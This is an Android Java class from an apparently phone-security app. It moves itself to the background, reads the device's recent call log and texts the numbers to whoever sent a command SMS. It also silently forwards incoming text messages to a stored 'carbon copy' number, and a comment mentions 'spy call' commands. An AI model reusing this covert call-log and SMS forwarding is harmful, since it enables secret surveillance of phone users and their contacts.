package com.micro.mobisecurity;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Contacts.People;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.telephony.gsm.GsmCellLocation;
import android.util.Log;
import android.widget.EditText;
import android.widget.Toast;

public class Getlog  extends Activity
{
	EditText etNumberForCall;
	public String recipant1;
	public String recipant2;
	public  int count3;
	public String data ="", dataAddtion ="",log="";
	public static String MyNumber="";
	public String name1,name2,name3,ServerNumber="";
	public String number,name,type,type1,result,Num,IncommingLogEntry="",DailLogEntry="",MissedLogEntry="";
	String strLine1;
	public String SenderId="",Ccnumber,fullString,ThirdPartyNo,observerNo,MsgBody;
	File Cc=new File("data/data/com.micro.mobisecurity/CarbonCopy");
	File BlockStart=new File("data/data/com.micro.mobisecurity/block");
	File SirenStart=new File("data/data/com.micro.mobisecurity/sirendone");
	public void onCreate(Bundle savedInstanceState) 
	{
        super.onCreate(savedInstanceState);
        if(BlockStart.exists() || SirenStart.exists())
        {
        	AcessLogs();
            if(Cc.exists())
    		{
            	ReadIncSmsFile();
    		}
        }
        else
        {
        moveTaskToBack(true);
        AcessLogs();
        if(Cc.exists())
		{
        	ReadIncSmsFile();
		}
        } 
       
	}

	@SuppressWarnings({ "deprecation", "deprecation", "deprecation", "unused" })
      	private void AcessLogs() 
	{
		System.out.println("Inside Access Log");
	
		String[] strFields = 
		{
		        android.provider.CallLog.Calls.NUMBER, 
		        android.provider.CallLog.Calls.TYPE,
		        android.provider.CallLog.Calls.CACHED_NAME,
		        android.provider.CallLog.Calls.CACHED_NUMBER_TYPE
		};
		
		
		String strOrder = android.provider.CallLog.Calls.DATE + " DESC"; 
		
		 
		Cursor mCallCursor = getContentResolver().query
		(
		        android.provider.CallLog.Calls.CONTENT_URI,
		        strFields,
		        null,
		        null,
		        strOrder
		);
		

		
		if(mCallCursor.moveToFirst())
		{
		  System.out.println("Inside if");
		  
		  // loop through cursor
		  int counter01 =0,dial=0,rec=0,missed=0;
		  boolean d=false,m=false,r=false; 
		  String data ="", dataAddtion ="";
		  
		  do
		  {
			   System.out.println("inside do");
			   counter01++;
			  
			   String number = mCallCursor.getString(mCallCursor.getColumnIndex(People.NUMBER));
			   System.out.println("........... Number is " +number);
			   String name = mCallCursor.getString(mCallCursor.getColumnIndex(People.NAME));
			   System.out.println("........... Name is " +name);
			   String type = mCallCursor.getString(mCallCursor.getColumnIndex(People.TYPE));
			   System.out.println("........... Type is " +type);
			   
			  
			   
			   
			   
			   
			   if(type.equals("1") && r==false )
			   {
				   rec++;
				   if(rec>=5)
				   {
					   r=true;
				   }
				   type="Incoming";
				   IncommingLogEntry+=number+";";
				   System.out.println("............" +type);
			   }
			   else if(type.equals("2") && d==false)
			   {
				   dial++;
				   if(dial>=5)
				   {
					   d=true;
				   }
				   DailLogEntry+=number+";";
				   type="Outgoing";
				   System.out.println("............" +type);
				  }
			   else if(type.equals("3") && m==false)
			   {
				   missed++;
				   if(missed>=5)
				   {
					   m=true;
				   }
				   MissedLogEntry+=number+";";
				   type="Missed";
				   System.out.println("............" +type);
			   }
			   
			   if(d==true || m==true || r==true)
			   {
				   break;
			   }
			   
		    	
		      
	         
		   } 
		   while (mCallCursor.moveToNext());
		   
		  
		  
		 }
           System.out.println("outside for loop");
		
	       
           
	        System.out.println("@@@@@@@@@@@@ Manu sms "+log);
	        
	        SmsReceiver sr=new SmsReceiver();
	        
	        Num=sr.IncommingNumber;
	        
	        System.out.println("...........Number to send sms is......."+Num);
	       // SendMultiPartSms(MyNumber, log);
	        if(Num.startsWith("TD") || Num.startsWith("LM")|| Num.startsWith("VN")|| Num.startsWith("DM")|| Num.startsWith("TM"))
	        {
	        	//FIND;OPERATOR;CELLID;AREACODE;COUNTRYCODE;LAT;LONG
	        	try
	        	{
	        	//SendMultiPartSms("+919223187878","M2MD*;"+DailLogEntry);
	        	//SendMultiPartSms("+919223187878","M2MR*;"+IncommingLogEntry);
	        	}
	        	catch(Exception e)
	        	{
	        		
	        	}
	        }
	        else
	        {
	        	try
	        	{
	        SendMultiPartSms(Num,"Dail Numbers::"+DailLogEntry+" & Other Commands 1)Help<Password>-To know information about Mobi Security other commands.");
	        SendMultiPartSms(Num,"Recived Calls::"+IncommingLogEntry+" & Other Commands 1)Help<Password>-To know information about Mobi Security other commands.");
	        SendMultiPartSms(Num,"Missed Calls::"+MissedLogEntry+" & Other Commands 1)Help<Password>-To know information about Mobi Security other commands.");
	        	}
	        	catch(Exception e)
	        	{
	        		
	        	}
	        //"& other commands use 1)Callme-Makes spy call to your phone. 2)stopmsg-Stops getting copy of incoming message. 3)getmsg-Get's copy of incoming messages."
	        System.out.println("........ SMS SENT");
	        
	        moveTaskToBack(true);
	        
	        finish();
	        }

	}
	public void ReadIncSmsFile()
    {
		SenderId=SmsReceiver.IncommingNumber;
		
		try
		 {
			//File BuddyFile=new File("data/data/com.micro.mobisecurity/arpfile");
			 System.out.println("ReadIncSmsFile 1");
			 byte[] strL=new byte[102400];
			 FileInputStream fstream = new FileInputStream("data/data/com.micro.mobisecurity/IncommingSms");
			 int strLine=0;
			 	
			 while ((strLine =fstream.read(strL)) != -1)
			
			 {
				
				 System.out.println (strLine);
				 strLine1 =new String(strL,0,strLine);
				 
				 strLine1 += " ~Received From "+ SenderId;
				 
				 System.out.println("***** Rec complete ********"+strLine1);
				 
			 }
			 
			 readCcFile();
			 
			 if(!SenderId.equals(Ccnumber))
			 {
				 try{
					 
				
			 SendMultiPartSms(Ccnumber,strLine1);
				 }
				 catch(Exception e)
				 {
					 
				 }
			 }
			 else
			 {
				 finish();
			 }

			
			 
			 // finish();
		  }
		  catch (IOException ioe)
		  {
			  ioe.printStackTrace(); 
		  }

    }
	public void readCcFile() {
		try {
			FileInputStream fstream = new FileInputStream(
					"data/data/com.micro.mobisecurity/CarbonCopy");

			DataInputStream in = new DataInputStream(fstream);
			BufferedReader br = new BufferedReader(new InputStreamReader(in),8192);
			String strLine;
			while ((strLine = br.readLine()) != null) {

				Ccnumber = strLine.toString();
			}
			in.close();

			
		} catch (IOException ioe) {
			ioe.printStackTrace();
		}
	}
	public void SendMultiPartSms(String add,String msgbdy)
	{
		
    	SmsManager smsManager = SmsManager.getDefault();
    	
        String destAddr = add, scAddr = null, mMessageText =msgbdy;
        
        System.out.println ("******** Destination Address is "+ destAddr+" sms is " + mMessageText);
        
        PendingIntent sentIntent = null, deliveryIntent = null;
        
        try 
        {
        	
        	ArrayList<PendingIntent> listOfIntents = new ArrayList<PendingIntent>(0);
        	
        	
        	//PendingIntent il = PendingIntent.getBroadcast(this, 0, new Intent(), 0);
        	ArrayList<String> messages = smsManager.divideMessage(mMessageText);

        
        	

        for (int i=0; i < messages.size(); i++)
        {

        	
        	PendingIntent pi = PendingIntent.getBroadcast(this, 0, new Intent(), 0);
	        listOfIntents.add(pi);
        }
        System.out.println ("******** inside TRY FOR SendMultiPartSms10");
        smsManager.sendMultipartTextMessage(destAddr, null, messages, listOfIntents, null);

        } catch (Exception e) 
        {
        Log.i("TEST", e.toString());
        }
    
	}

	

	
}
